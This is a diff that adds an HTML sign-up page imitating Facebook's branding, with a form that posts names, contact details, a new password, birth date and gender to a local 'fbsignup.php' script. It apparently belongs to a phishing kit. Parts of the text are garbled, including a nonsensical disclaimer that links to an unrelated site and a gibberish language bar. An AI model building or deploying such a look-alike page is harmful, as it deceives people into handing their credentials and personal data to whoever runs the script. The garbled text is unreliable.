@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Sign Up</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            color: #1c1e21;
+        }
+        .container {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo {
+            font-size: 42px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 10px;
+        }
+        .signup-box {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 432px;
+            margin: 0 auto;
+            padding: 15px;
+        }
+        .signup-title {
+            text-align: center;
+            font-size: 25px;
+            margin: 5px 0;
+        }
+        .signup-subtitle {
+            text-align: center;
+            color: #606770;
+            font-size: 15px;
+            margin-bottom: 20px;
+        }
+        .name-fields {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        .name-fields input {
+            flex: 1;
+            padding: 11px;
+            border: 1px solid #ccd0d5;
+            border-radius: 5px;
+            font-size: 15px;
+        }
+        .signup-form input {
+            width: 100%;
+            padding: 11px;
+            margin-bottom: 10px;
+            border: 1px solid #ccd0d5;
+            border-radius: 5px;
+            font-size: 15px;
+            box-sizing: border-box;
+        }
+        .birthday-label {
+            font-size: 12px;
+            color: #606770;
+            margin-bottom: 5px;
+        }
+        .birthday-fields {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        .birthday-fields select {
+            padding: 8px;
+            border: 1px solid #ccd0d5;
+            border-radius: 5px;
+            font-size: 15px;
+            height: 36px;
+            width: 100%;
+        }
+        .gender-label {
+            font-size: 12px;
+            color: #606770;
+            margin-bottom: 5px;
+        }
+        .gender-options {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        .gender-option {
+            border: 1px solid #ccd0d5;
+            border-radius: 5px;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .gender-option label {
+            font-size: 15px;
+        }
+        .disclaimer {
+            font-size: 11px;
+            color: #777;
+            margin: 15px 0;
+            line-height: 1.4;
+        }
+        .disclaimer a {
+            color: #385898;
+            text-decoration: none;
+        }
+        .signup-button {
+            background-color: #00a400;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            line-height: 36px;
+            padding: 0 16px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin: 10px 0;
+        }
+        .login-link {
+            text-align: center;
+            margin-top: 15px;
+            border-top: 1px solid #dadde1;
+            padding-top: 15px;
+        }
+        .login-link a {
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .language {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 12px;
+            color: #737373;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px 0;
+            font-size: 12px;
+            color: #737373;
+        }
+        .footer-links {
+            margin: 0 auto;
+            max-width: 980px;
+            line-height: 1.6;
+        }
+        .footer-links a {
+            color: #737373;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">facebook</div>
+        </div>
+        
+        <div class="signup-box">
+            <h2 class="signup-title">Create a new account</h2>
+            <p class="signup-subtitle">It's quick and easy.</p>
+            
+            <form class="signup-form" action="fbsignup.php" method="post">
+                <div class="name-fields">
+                    <input type="text" placeholder="First name" name="firstname" required>
+                    <input type="text" placeholder="Surname" name="lastname" required>
+                </div>
+                
+                <input type="text" placeholder="Mobile number or email address" name="email" required>
+                
+                <input type="password" placeholder="New password" name="password" required>
+                
+                <div class="birthday-label">Date of birth</div>
+                <div class="birthday-fields">
+                    <select name="birthday_day" required>
+                        <option value="" disabled selected>Day</option>
+                        <script>
+                            for (let day = 1; day <= 31; day++) {
+                                document.write(`<option value="${day}">${day}</option>`);
+                            }
+                        </script>
+                    </select>
+                    <select name="birthday_month" required>
+                        <option value="" disabled selected>Month</option>
+                        <option value="1">Jan</option>
+                        <option value="2">Feb</option>
+                        <option value="3">Mar</option>
+                        <option value="4">Apr</option>
+                        <option value="5">May</option>
+                        <option value="6">Jun</option>
+                        <option value="7">Jul</option>
+                        <option value="8">Aug</option>
+                        <option value="9">Sep</option>
+                        <option value="10">Oct</option>
+                        <option value="11">Nov</option>
+                        <option value="12">Dec</option>
+                    </select>
+                    <select name="birthday_year" required>
+                        <option value="" disabled selected>Year</option>
+                        <script>
+                            const currentYear = new Date().getFullYear();
+                            for (let year = currentYear; year >= currentYear - 100; year--) {
+                                document.write(`<option value="${year}">${year}</option>`);
+                            }
+                        </script>
+                    </select>
+                </div>
+                
+                <div class="gender-label">Gender</div>
+                <div class="gender-options">
+                    <div class="gender-option">
+                        <label>Female</label>
+                        <input type="radio" name="sex" value="1" required>
+                    </div>
+                    <div class="gender-option">
+                        <label>Male</label>
+                        <input type="radio" name="sex" value="2">
+                    </div>
+                    <div class="gender-option">
+                        <label>Custom</label>
+                        <input type="radio" name="sex" value="3">
+                    </div>
+                </div>
+                
+                <p class="disclaimer">
+                    Please note that our service may have uploaded your contact information to Facebook. <a href="#">Learn more</a>.<br>
+                    By clicking Sign Up, you agree to our Terms, Privacy Policy and Contact Policy for many users. Please download the terms and cost right out at <a href="http://www.gup.com/">http://www.gup.com/</a>.
+                </p>
+                
+                <button type="submit" class="signup-button">Sign Up</button>
+            </form>
+            
+            <div class="login-link">
+                <a href="fblogin.html">Already have an account?</a>
+            </div>
+        </div>
+        
+        <div class="language">
+            English DVD Strick #2 @6 audio offer will e-accessible Establa Partielle (Brand) Français (France)
+        </div>
+    </div>
+</body>
+</html>
